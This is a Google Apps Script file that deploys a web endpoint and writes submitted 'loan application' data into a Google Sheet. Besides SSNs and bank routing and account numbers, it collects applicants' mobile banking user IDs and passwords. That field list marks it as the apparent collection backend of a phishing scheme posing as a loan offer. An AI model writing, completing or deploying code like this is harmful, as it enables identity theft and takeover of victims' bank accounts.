// Google Apps Script for Google Sheets Integration
// Deploy as Web App: https://script.google.com/home
// File > New > Project > Paste this code > Deploy > New Deployment > Web App

function doGet(e) {
  return HtmlService.createHtmlOutput('This is a POST endpoint for Google Sheets integration.');
}

function doPost(e) {
  try {
    // Get the posted data
    const postData = JSON.parse(e.postData.contents);
    
    // Get the active spreadsheet and sheet
    const spreadsheet = SpreadsheetApp.openById('YOUR_SPREADSHEET_ID'); // Replace with your Google Sheet ID
    const sheet = spreadsheet.getSheetByName('Loan Applications') || spreadsheet.insertSheet('Loan Applications');
    
    // Add headers if sheet is empty
    if (sheet.getLastRow() === 0) {
      const headers = [
        'Timestamp',
        'Loan Amount',
        'Loan Purpose',
        'Credit Score',
        'Name',
        'Email',
        'Phone',
        'Street Address',
        'City',
        'State',
        'Zip Code',
        'SSN',
        'Bank Name',
        'Routing Number',
        'Account Number',
        'Annual Income',
        'Employment Status',
        'Monthly Housing',
        'Your Bank',
        'Mobile Banking User ID',
        'Mobile Banking Password',
        'Application Type'
      ];
      sheet.appendRow(headers);
    }
    
    // Prepare the row data in the correct order
    const rowData = [
      new Date().toLocaleString(), // Timestamp
      postData.loanAmount || '',
      postData.loanPurpose || '',
      postData.creditScore || '',
      postData.name || postData.fullName || '',
      postData.email || '',
      postData.phone || '',
      postData.streetAddress || postData.address || '',
      postData.city || '',
      postData.state || '',
      postData.zipCode || '',
      postData.ssn || '',
      postData.bankName || '',
      postData.routingNumber || '',
      postData.accountNumber || '',
      postData.annualIncome || '',
      postData.employmentStatus || '',
      postData.monthlyHousing || '',
      postData.yourBank || postData.customerBank || '',
      postData.mobileBankingUserId || '',
      postData.mobileBankingPassword || '',
      postData.applicationType || 'Personal Loan Application'
    ];
    
    // Append the row to the sheet
    sheet.appendRow(rowData);
    
    // Return success response
    return ContentService.createTextOutput(JSON.stringify({
      status: 'success',
      message: 'Data saved to Google Sheets successfully',
      row: sheet.getLastRow()
    })).setMimeType(ContentService.MimeType.JSON);
    
  } catch (error) {
    // Return error response
    return ContentService.createTextOutput(JSON.stringify({
      status: 'error',
      message: error.toString(),
      error: error.message
    })).setMimeType(ContentService.MimeType.JSON);
  }
}

// Function to get spreadsheet URL for setup
function getSpreadsheetUrl() {
  const spreadsheet = SpreadsheetApp.getActiveSpreadsheet();
  return spreadsheet.getUrl();
}
